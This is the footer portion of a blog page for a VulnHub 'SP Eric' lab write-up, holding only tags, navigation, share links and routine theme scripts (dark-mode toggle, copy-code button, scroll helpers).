    <ul class="post-tags">
      <li><a href="/tags/git/">git</a></li>
      <li><a href="/tags/ssh/">ssh</a></li>
      <li><a href="/tags/msfvenom/">msfvenom</a></li>
      <li><a href="/tags/metasploit/">metasploit</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="/posts/vulnhub-sunset-nightfall/">
    <span class="title">« Prev Page</span>
    <br>
    <span>VulnHub: Sunset Nightfall</span>
  </a>
  <a class="next" href="/posts/text-clock/">
    <span class="title">Next Page »</span>
    <br>
    <span>Text Clock</span>
  </a>
</nav>

<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share VulnHub: SP Eric on twitter"
        href="https://twitter.com/intent/tweet/?text=VulnHub%3a%20SP%20Eric&amp;url=%2fposts%2fmy-first-writeup%2f&amp;hashtags=git%2cssh%2cmsfvenom%2cmetasploit">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share VulnHub: SP Eric on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2fposts%2fmy-first-writeup%2f&amp;title=VulnHub%3a%20SP%20Eric&amp;summary=VulnHub%3a%20SP%20Eric&amp;source=%2fposts%2fmy-first-writeup%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share VulnHub: SP Eric on reddit"
        href="https://reddit.com/submit?url=%2fposts%2fmy-first-writeup%2f&title=VulnHub%3a%20SP%20Eric">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share VulnHub: SP Eric on facebook"
        href="https://facebook.com/sharer/sharer.php?u=%2fposts%2fmy-first-writeup%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share VulnHub: SP Eric on whatsapp"
        href="https://api.whatsapp.com/send?text=VulnHub%3a%20SP%20Eric%20-%20%2fposts%2fmy-first-writeup%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share VulnHub: SP Eric on telegram"
        href="https://telegram.me/share/url?text=VulnHub%3a%20SP%20Eric&amp;url=%2fposts%2fmy-first-writeup%2f">
        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
            <path
                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
        </svg>
    </a>
</div>

  </footer>
</article>
    </main>
    <footer class="footer">
    <span>&copy; 2021 <a href="/">PaperMod</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
    <button class="top-link" id="top-link" type="button" accesskey="g">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
            <path d="M12 6H0l6-6z" />
        </svg>
    </button>
</a>

<script>
    let menu = document.getElementById('menu')
    menu.scrollLeft = localStorage.getItem("menu-scroll-position");
    menu.onscroll = function () {
        localStorage.setItem("menu-scroll-position", menu.scrollLeft);
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerText = 'copy';

        function copyingDone() {
            copybutton.innerText = 'copied!';
            setTimeout(() => {
                copybutton.innerText = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
